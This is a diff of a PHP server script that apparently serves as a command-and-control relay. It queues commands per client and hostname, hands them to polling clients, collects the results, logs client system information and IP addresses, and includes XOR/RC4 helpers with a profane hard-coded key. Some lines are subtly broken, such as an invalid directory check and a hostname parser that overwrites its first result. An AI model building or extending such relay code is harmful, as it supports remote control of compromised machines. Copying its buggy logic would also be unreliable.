@@ -12,7 +12,11 @@ if($method == "GET"){
     $q_str = $_SERVER["QUERY_STRING"];
 }else if($method == "POST"){
     $q_str = file_get_contents("php://input");
-	//echo "post data start:".$q_str."post data end";
+	
+	$key = 'fuck crackers who want to crack this program!';
+	
+	//$q_str = xor_crypt($q_str,$key); 
+
 }
 
 $Sig = substr($q_str,0,3);
@@ -113,8 +117,17 @@ if($qlen >= 12){
     case "$$32":
         WriteFileSata($q_str,$qlen);break;
 		
-	case "$$33":
-        readOnline($q_str,$qlen);break;
+	case "$$34":
+        bringCommand($q_str,$qlen);break;
+		
+	case "$$35":
+        fetchCommand($q_str,$qlen);break;
+		
+	case "$$36":
+        putCommandResult($q_str,$qlen);break;
+		
+	case "$$37":
+        takeCommandResult($q_str,$qlen);break;
 	}
   }
 }
@@ -143,6 +156,47 @@ function  WriteFileSata($qstr,$qlen)
 
     ret_success();
 }
+
+
+function xor_enc($data,$key)
+{
+	$crytxt = '';
+	$keylen = strlen($key);
+	
+	$len = strlen($data);
+	
+	for($i=0;$i<$len;$i++)
+	{   
+		$k = $i%$keylen;
+		$crytxt .= $data[$i] ^ $key[$k];
+	}
+	return $crytxt;
+}
+
+
+
+function xor_crypt($data,$key)
+{
+	$newdata = '';
+	
+	$len = strlen($data);
+	//$key = 'fuck crackers who want to crack this program!';
+	
+	$keylen = strlen($key);
+
+	for($i = 0,$j=0;$i < $len;$i++)
+	{	
+		$newdata .= ($data[$i]) ^ ($key[$j]);
+		$j ++;
+		if($j >= $keylen)
+		{		
+			$j = 0;
+		}
+	}
+	
+	return $newdata;
+}
+
 
 function rc4_data ($pwd, $data)
 {
@@ -205,6 +259,27 @@ function get_hostname($str){
     $hostname = substr($str,$offset, $hlen);
     return $hostname;
 }
+
+
+function get_hostname2($str){
+    $offset = 4;
+    $hlen_str = substr($str,$offset,1);
+    $hlen_int = unpack("C",$hlen_str);
+    $hlen = $hlen_int[1];
+    $offset += 1;
+	
+    $hostname = substr($str,$offset, $hlen);
+	
+	$offset += $hlen;
+	$hlen_str = substr($str,$offset,1);
+    $hlen_int = unpack("C",$hlen_str);
+    $hlen = $hlen_int[1];
+    $offset += 1;
+	
+	$hostname = substr($str,$offset, $hlen);
+    return $hostname;
+}
+
     
 function get_id_path($str){
 	//$offset = 4;
@@ -251,6 +326,9 @@ function write_to_file($tpath, $wstr){
 
 }
 
+
+
+
 function file_put_writex($tpath, $wstr){
     $fp = fopen($tpath,"wb+");
     if ($fp){
@@ -272,21 +350,6 @@ function write_up_data($tpath, $wstr){
 }
 
 
-function readOnline($qstr,$qlen){
-	
-	$id_path = get_id_path($qstr);
-
-    $fixname = "sysinfo";
-    $tpath = $id_path.$fixname;
-    if (is_readable($tpath)){
-		$info =  file_get_contents($tpath);
-		echo "Data";
-		echo $info;
-		echo "Data";
-	}else{		
-		dir("Atad");
-	}
-}
 
 function online($qstr,$qlen){
     $id_path = get_id_path($qstr);
@@ -295,7 +358,8 @@ function online($qstr,$qlen){
     $tpath = $id_path.$fixname;
 
     $offset = 4;
-    $info = substr($qstr,$offset,$qlen-$offset);
+    //$info = substr($qstr,$offset,$qlen-$offset);
+	$info = substr($qstr,$offset,$qlen-$offset);
 
     $ip = $_SERVER["REMOTE_ADDR"];
     $ip_len = pack("C",strlen($ip));
@@ -309,10 +373,12 @@ function online($qstr,$qlen){
 	//echo $info."\n\n";
 
     if (file_put_writex($tpath,$info)){
-	echo "Data";
+		echo "Data";	
+		fetchCommand($qstr);	
     }else{
-	dir("Atad");
+		dir("Atad");
     }
+	
     return 0;
 }
 
@@ -343,6 +409,94 @@ function query_operate($qstr,$qlen){
 
     ret_success();    
 }
+
+
+
+
+
+
+
+function bringCommand($qstr,$qlen)
+{
+	$path = get_id_path($qstr)."command/";
+	if(!$path.is_dir() ){
+		mkdir($path,0777,true);
+	}
+	
+	$server = get_hostname2($qstr);
+
+	$tpath = $path.$server;
+	
+	//echo $tpath;
+	
+	//echo $path
+	
+	//echo $server
+	
+	file_put_writex($tpath,$qstr);
+	
+	//$_SESSION[$tpath] = $qstr;
+	
+	ret_success(); 
+}
+
+
+
+function fetchCommand($qstr,$qlen){
+
+	$path = get_id_path($qstr);
+	
+	$tpath = $path."command/";
+	
+	$filenames = glob($tpath."*");	//*.* is different to *
+	
+	if(count($filenames) > 0){
+	    foreach($filenames as $filename){
+			//echo $filename;
+			if(is_file($filename)){
+				if (is_readable($filename)){
+					$result = file_get_contents($filename);
+					echo($result);
+					unlink($filename);
+					ret_success(); 
+				}
+			}
+	    }
+	}
+}
+
+function putCommandResult($qstr,$qlen){
+	
+	$path = get_id_path($qstr)."commandResult/";
+	
+	$server = get_hostname2($qstr);
+	
+	$tpath = $path.$server;
+
+	$_SESSION[$tpath] = $qstr;
+	
+	ret_success(); 
+}
+
+function takeCommandResult($qstr,$qlen)
+{
+	$path = get_id_path($qstr);
+	
+	$server = get_hostname2($qstr);
+	
+	$tpath = $path."commandResult/".$server;
+	
+	$qss = $_SESSION[$tpath];
+    echo "Data".$qss."Data";
+    unset($_SESSION[$tpath]);
+}
+
+
+
+
+
+
+
 
 function  get_host($qstr,$qlen){
     $queryType = substr($qstr,4,4);
@@ -428,7 +582,7 @@ function get_driver($qstr,$qlen){
 
     $fixname = "driverr";
     $tpath = $id_path.$fixname;
-    //readable_ready_delete($tpath);
+    readable_ready_delete($tpath);
 
     $fixname = "driver";
     $tpath = $id_path.$fixname;
